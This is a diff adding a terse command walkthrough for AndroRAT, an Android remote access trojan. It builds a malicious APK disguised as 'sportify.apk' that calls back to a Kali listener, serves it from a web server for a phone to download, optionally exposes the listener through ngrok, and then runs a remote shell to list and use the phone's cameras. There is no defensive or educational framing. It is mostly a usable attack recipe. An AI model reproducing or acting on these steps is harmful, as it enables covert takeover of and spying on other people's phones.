@@ -1,0 +1,30 @@
+cd AndroRAT
+ls
+pip install -r requirements.txt
+cat requirements.txt
+python3 androRAT.py --build -i {ip of kali} -p 4444 -o sportify.apk
+python3 androRAT.py --shell -i 0.0.0.0 -p 4444
+#open new teminal in kali and type
+cd AndroRAT
+sudo cp {app name.apk} /var/www/html
+#open android and open browser to type
+{ip of kali}/{apk name}
+#give all permissions in android for access
+help #for commands 
+ camlist
+takepic 1
+(or)
+./ngrok tcp 4444
+cd AndroRAT
+ls
+python3 androRAT.py --build -i {ngrok tcp of 4444 link} -p {port of ngrok} -o {apk name}
+sudo cp {apk name} /var/www/html/
+#open android and open browser to type
+{ip of kali}/{apk name}
+#In kali Type
+python3 androRAT.py --shell -i 0.0.0.0 -p 4444
+#open app
+#give permissions
+help #for commands
+ camlist
+takepic 1
